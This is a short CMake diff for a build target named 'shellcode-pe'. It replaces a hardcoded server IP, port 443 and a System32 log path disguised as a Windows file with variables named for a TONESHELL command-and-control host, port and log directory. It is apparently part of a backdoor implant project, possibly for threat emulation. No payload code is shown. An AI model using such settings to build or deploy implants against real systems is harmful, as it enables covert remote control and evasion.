@@ -56,9 +56,9 @@ target_include_directories(
 target_compile_definitions(
     shellcode-pe
     PRIVATE
-    SERVER="191.44.44.199"
-    PORT=443
-    SH_LOG_FILE="C:\\\\Windows\\\\System32\\\\wsdapi_dat.log"
+    SERVER="${TONESHELL_C2_HOST}"
+    PORT=${TONESHELL_C2_PORT}
+    SH_LOG_FILE="${TONESHELL_LOG_DIR}/wsdapi_dat.log"
     ENCRYPTED_LOGGING=1 # set to 0 to disable, set to non-0 to enable
 )
 
